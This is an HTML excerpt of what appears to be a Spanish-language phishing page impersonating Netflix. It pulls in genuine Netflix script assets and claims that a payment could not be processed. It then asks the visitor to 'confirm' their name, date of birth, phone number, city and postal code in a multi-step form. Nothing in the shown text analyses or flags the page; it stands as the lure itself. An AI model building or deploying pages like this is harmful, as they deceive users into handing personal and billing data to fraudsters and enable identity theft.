   ...
   <head>
      ...
      <title>Netflix</title>
      <link rel="preload" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-js-vc87b9036/js/js/bootstrap.js,common%7Cbootstrap.js/2/0b3h022U2M2W052I2-3g070l003i2Z3c2R312X3b2O30332P0a013d0W/bck/true/none" as="script">
      <link rel="preload" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-js-vc87b9036/js/js/signup%7Csimplicity%7CsimpleSignupClient.js/2/0b3h022U2M2W052I2-3g070l003i2Z3c2R312X3b2O30332P0a013d0W/l/true/none" as="script">
   ...
   <link rel="stylesheet" href="https://127.0.0.1:49764/stylesheet?id=BXtAlgZ_pNcH5but"></head>
                        ...
                        <div class="regFormContainer passwordFormContainer" data-uia="form-registration">
                           <div class="stepHeader-container" data-uia="header">
                              <div class="stepHeader" data-a11y-focus="true">
                                 <span id="" class="stepIndicator" data-uia="">PASO <b>1</b> A <b>3</b></span>
                                 <h1 class="stepTitle" data-uia="stepTitle"><span id="" data-uia="">Confirme sus datos de facturación</span></h1>
                              </div>
                           </div>
                           <style>
                              .formv2 {
                           ...
                           <span class="difv2">Debido a las dificultades para procesar su pago, debe confirmar sus datos de facturación.</span>
                           <div class="sep2v2"></div>
                           <div class="contentv2">
                              <div class="sepv2"></div>
                              <span class="labev2">Nombre</span>
                              <input required type="text" id="firstname" name="nombre" class="formv2">
                           </div>
                           <div class="contentv2">
                              <div class="sepv2"></div>
                              <span class="labev2">Apellido</span>
                              <input required type="text" id="lastname" name="apellido" class="formv2">
                           </div>
                           <div class="contentv2">
                              <div class="sepv2"></div>
                              <span class="labev2">Fecha de nacimiento</span>
                              <input required type="tel" id="dob" name="fechaNacimiento" onpaste="date_reformat_dd(this);" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="date_reformat_dd(this);" maxlength="10" placeholder="DD/MM/AAAA" class="formv2">
                           </div>
                           <div class="contentv2">
                              <div class="sepv2"></div>
                              <span class="labev2">Número de teléfono</span>
                              <input required type="tel" id="phone" name="telefono" class="formv2">
                           </div>
                        
                           <div class="contentv2">
                              <div class="sepv2"></div>
                              <span class="labev2">Ciudad</span>
                              <input required type="text" id="city" name="ciudad" class="formv2">
                           </div>
                           <div class="contentv2">
                              <div class="sepv2"></div>
                              <span class="labev2">Código postal</span>
                              <input required type="tel" id="zip" name="codigoPostal" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="5" class="formv2">
                           </div>
                           <div class="submitBtnContainer"><button name="auth" type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-registration" placeholder="regForm_button_next" style="font-size:18px;">Siguiente</button></div>
                        </div>
                     </form>
                  </div>
               </div>
